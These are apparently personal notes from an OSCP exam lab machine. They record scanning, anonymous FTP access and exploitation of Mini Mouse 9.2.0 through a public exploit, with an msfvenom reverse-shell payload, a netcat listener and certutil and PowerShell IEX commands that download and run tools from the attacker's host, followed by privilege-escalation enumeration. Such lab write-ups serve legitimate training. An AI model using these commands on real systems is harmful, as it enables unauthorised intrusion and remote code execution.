```shell
rustscan -a 192.168.118.114
PORT      STATE SERVICE       REASON
21/tcp    open  ftp           syn-ack ttl 127
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5040/tcp  open  unknown       syn-ack ttl 127
5357/tcp  open  wsdapi        syn-ack ttl 127
8039/tcp  open  unknown       syn-ack ttl 127
8080/tcp  open  http-proxy    syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127
49671/tcp open  unknown       syn-ack ttl 127
49672/tcp open  unknown       syn-ack ttl 127
```

![[ftp 1.png]]![[Penetration Testing v2/oscp pass 20230412/2. 192.168.118.114 - done/screenshot actual/ftp 2.png]]

```shell

┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -sU 192.168.118.114            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 04:49 EDT
Nmap scan report for 192.168.118.114
Host is up (0.056s latency).
Not shown: 988 closed udp ports (port-unreach)
PORT      STATE         SERVICE
123/udp   open|filtered ntp
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
500/udp   open|filtered isakmp
1900/udp  open|filtered upnp
3389/udp  open|filtered ms-wbt-server
3702/udp  open|filtered ws-discovery
4500/udp  open|filtered nat-t-ike
5050/udp  open|filtered mmcc
5353/udp  open|filtered zeroconf
5355/udp  open|filtered llmnr
19181/udp open|filtered unknown

- anonymous ftp login allowed
```shell
┌──(root㉿kali)-[/home/kali]
└─# ftp 192.168.118.114                                                                                          
Connected to 192.168.118.114.
220 Microsoft FTP Service
Name (192.168.118.114:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50439|)
125 Data connection already open; Transfer starting.
02-07-22  03:49AM              5242368 minimouse.msi
02-07-22  04:20AM             10816785 WBCE_CMS-1.5.2.zip
226 Transfer complete.
ftp> 


```


- smb client
```shell

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# crackmapexec smb 192.168.118.114 -u 'guest' -p '' --sessions
SMB         192.168.118.114 445    OSCP             [*] Windows 10.0 Build 19041 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.118.114 445    OSCP             [-] oscp\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# crackmapexec smb 192.168.118.114 -u '' -p '' --sessions 
SMB         192.168.118.114 445    OSCP             [*] Windows 10.0 Build 19041 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.118.114 445    OSCP             [-] oscp\: STATUS_ACCESS_DENIED 



┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# smbclient -L \\\\192.168.118.114 -N
session setup failed: NT_STATUS_ACCESS_DENIED


```

gobuster web fuzzing - Port 80

```shell

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.114:80 -w /usr/share/dirb/wordlists/common.txt -k
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.114:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/04/13 04:08:55 Starting gobuster in directory enumeration mode
===============================================================
Progress: 4537 / 4615 (98.31%)
===============================================================2023/04/13 04:09:20 Finished
===============================================================
                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.114:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.114:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/13 04:13:40 Starting gobuster in directory enumeration mode
===============================================================
Progress: 27666 / 27690 (99.91%)
===============================================================
2023/04/13 04:16:08 Finished
===============================================================
                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# 

```

gobuster port 8080

```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.114:8080 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.114:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/13 04:15:21 Starting gobuster in directory enumeration mode
===============================================================
Progress: 27671 / 27690 (99.93%)
===============================================================
2023/04/13 04:17:48 Finished
===============================================================
                                                                        
```

dirsearch port 80

```shell

┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://192.168.118.114:80 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js, asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/192.168.118.114-80/_23-04-13_04-09-14.txt

Error Log: /root/.dirsearch/logs/errors-23-04-13_04-09-14.log

Target: http://192.168.118.114:80/

[04:09:14] Starting: 
[###                 ] 17% 37980/220545[###                 ] 17% 37981/220545[###                 ] 17% 37982/220545[###                 ] 17% 37983/220545[###                 ] 17% 37984/220545[###                 ] 17% 37985/220545[###                 ] 17% 37986/220545[###                 ] 17% 37987/220545[###                 ] 17% 37988/220545[###                 ] 17% 37989/220545[###                 ] 17% 37990/220545[###                 ] 17% 37991/220545
Task Completed
                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# 

```


gobuster port 8039

```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# gobuster dir -u http://192.168.118.114:8039 -w /usr/share/dirb/wordlists/common.txt -k
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.114:8039
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/04/13 04:24:15 Starting gobuster in directory enumeration mode
===============================================================
/aux                  (Status: 200) [Size: 0]
/com1                 (Status: 200) [Size: 0]                                 /com3                 (Status: 200) [Size: 0]
/com2                 (Status: 200) [Size: 0]
/con                  (Status: 200) [Size: 0]
/lpt2                 (Status: 200) [Size: 0]
/lpt1                 (Status: 200) [Size: 0]
/nul                  (Status: 200) [Size: 0]
/prn                  (Status: 200) [Size: 0]
Progress: 4592 / 4615 (99.50%)
===============================================================
2023/04/13 04:25:04 Finished
===============================================================
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]

```


Able to unzip the file pulled from the ftp server

- WBCE_CMS-1.5.2 is a version
- PHP 7.2.5
- Mostly Random Notes, other than minimous.msi identification on ftp server
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# jar xvf WBCE_CMS-1.5.2.zip 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# ls
minimouse.msi  WBCE_CMS-1.5.2  WBCE_CMS-1.5.2.zip

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# cd WBCE_CMS-1.5.2 

┌──(root㉿kali)-[/home/…/Documents/12apr_exam/192.168.118.114/WBCE_CMS-1.5.2]
└─# ls
CHANGELOG.md  INSTALL.md  LICENSE.md  README.md  SECURITY.md  wbce

┌──(root㉿kali)-[/home/…/Documents/12apr_exam/192.168.118.114/WBCE_CMS-1.5.2]
└─# cat README.md    
# WBCE CMS
[WBCE CMS](https://wbce.org) is a versatile, user friendly content management system. It is shipped with some modules for simple text pages, news, contact forms and includes useful admin tools. A broad variety of modules for galleries, interaction and structured content etc. is available in the [WBCE Add-On Repository](https://addons.wbce.org) and can be installed easily.

![Screenshot of WBCE Backend](https://wbce.org/screenshot-github-wbce-start-en.jpg)

## Minimum requirements
  - about 25 MB webspace
  - PHP 7.2.5 (released 26 Apr 2018) or newer
  - mySQL or MariaDB database
  - GD Library / Exif / Imagemagick (if you use any module with image processing)
  - mod_rewrite (if you use ShortURL)

## Links
  - [WBCE CMS Project Main Page](https://wbce.org)
  - [WBCE CMS english landing page](https://wbce-cms.org)
  - [User Forum](https://forum.wbce.org)
  - [User Documentation EN](https://help.wbce-cms.org)
  - [User Documentation DE](https://help.wbce.org)
  - [GitHub Repository](https://github.com/WBCE/WBCE_CMS)
  - [Bugtracker](https://github.com/WBCE/WBCE_CMS/issues)
  - [Commit History](https://github.com/WBCE/WBCE_CMS/commits/main)
  - [Versioning-Scheme](https://github.com/WBCE/WBCE_CMS/blob/main/wbce/admin/interface/version.php)
  - [Changelog](CHANGELOG.md)
  - [Installation](INSTALL.md)

## License
[WBCE CMS](https://wbce.org) is released under the **GNU General Public License v2** or any later version.
Please refer to the [LICENSE](LICENSE.md) file for a copy of the license.

    /**
     * WBCE CMS
     * Way Better Content Editing.
     * Visit https://wbce.org to learn more and to join the community.
     *
     * @copyright Ryan Djurovich (2004-2009)
     * @copyright WebsiteBaker Org. e.V. (2009-2015)
     * @copyright WBCE Project (2015-)
     * @license GNU GPL2 (or any later version)
     */

```

Nothing found in these files - just default php pages
```
┌──(root㉿kali)-[/home/…/192.168.118.114/WBCE_CMS-1.5.2/wbce/account]
└─# ls
confirm.php  forgot.php  index.php  login.php  logout.php  preferences.php  README.md  signup_continue_page.php  signup.php

```

Looking through here now:
```shell

┌──(root㉿kali)-[/home/…/192.168.118.114/WBCE_CMS-1.5.2/wbce/admin]
└─# ls
access  addons  admintools  groups  index.php  interface  languages

#cat index.php interesting info

// Check if the config file has been set-up
if (!defined('WB_PATH')) {
    header("Location: ../install/index.php");
} else {
    header('Location: ' . ADMIN_URL . '/start/index.php');

# nothing in access

# in addons reload.php

// Include required files
require '../../config.php';
require_once WB_PATH . '/framework/functions.php';
$js_back = ADMIN_URL . '/addons/index.php?advanced';


# in admin tools
  // FILTER for OPF DASHBOARD just for this module(tool)
    $file = WB_PATH . '/modules/outputfilter_dashboard/functions.php';
$returnUrl = ADMIN_URL . '/admintools/index.php';


#version.php
/////////////////////////////////////////
//   set WBCE version and release tag
/////////////////////////////////////////

define('NEW_WBCE_VERSION', '1.5.2'); // NEW_WBCE_VERSION
define('NEW_WBCE_TAG', '1.5.2'); // NEW_WBCE_TAG
````

- Creating Revshell to use with 
- Mini Mouse 9.2.0 - Remote Code Execution                                           | windows/webapps/49743.py

![[mini mouse searchsploit.png]]
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.118 LPORT=4231 -f exe -o rev.exe
`````

- I didnt have to modify any code, but I needed to pip install jsonargparse for the exploit to work
![[Penetration Testing v2/oscp pass 20230412/2. 192.168.118.114 - done/screenshot actual/pip install jsonargparse.png]]
```shell
# pip install jsonargparse
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# pip install jsonargparse

WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<pip._vendor.urllib3.connection.HTTPSConnection object at 0x7f468aa57370>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution')': /simple/jsonargparse/
Collecting jsonargparse
  Downloading jsonargparse-4.20.1-py3-none-any.whl (184 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 184.3/184.3 kB 6.0 MB/s eta 0:00:00
Requirement already satisfied: PyYAML>=3.13 in /usr/lib/python3/dist-packages (from jsonargparse) (6.0)
Installing collected packages: jsonargparse
Successfully installed jsonargparse-4.20.1
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv

```

- Throwing Exploit

![[mini mouse exploit throw.png]]
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# python3 49743.py
target's ip:  192.168.118.114
local http server ip: 192.168.49.118
payload file name: rev.exe
[+] Retrieving payload
200
[+] got shell!

```

- setting up netcat listener and http server and catching
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.114]
└─# python3 -m http.server 80         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.118.114 - - [13/Apr/2023 06:10:29] "GET /rev.exe HTTP/1.1" 200 -
192.168.118.114 - - [13/Apr/2023 06:10:29] "GET /rev.exe HTTP/1.1" 200 -


┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4231
listening on [any] 4231 ...
connect to [192.168.49.118] from (UNKNOWN) [192.168.118.114] 50520
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

```

![[netcat listener and http server.png]]



Local.txt and ip a
```shell
#local,txt & ip a

C:\Users\Derek\Desktop>type local.txt
type local.txt
d79aa3c13a297053f28563aebd15d8f7

C:\Users\Derek\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.118.114
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.118.254

C:\Users\Derek\Desktop>

```
![[local.txt and ipconfig.png]]



```shell

certutil.exe -urlcache -split -f "http://192.168.49.118/winPEASx64.exe"

going to use powerup

echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:80/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:80/PowerUp.ps1') | powershell -noprofile -
```


![[Penetration Testing v2/oscp pass 20230412/2. 192.168.118.114 - done/screenshot actual/power up modifiable service files.png]]

netcat & modifiable service files
```shell

┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4231
listening on [any] 4231 ...
connect to [192.168.49.118] from (UNKNOWN) [192.168.118.114] 50565
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Mini Mouse>echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:80/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:80/PowerUp.ps1') | powershell -noprofile -echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.118:80/PowerUp.ps1') | powershell -noprofile -


ServiceName                     : edgeupdate
Path                            : "C:\Program Files 
                                  (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate
Check                           : Modifiable Service Files

```



Opening powershell prompt to check accesses

```shell

Get-Acl -Path "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"
```


Your exam has ended, and your exam VPN got terminated. For the exam report submission, kindly check the updated https://upload.offsec.com application, and use the same MD5 and OSID value you used to join the proctor session. Thank you for working with us today. You may now close the proctoring session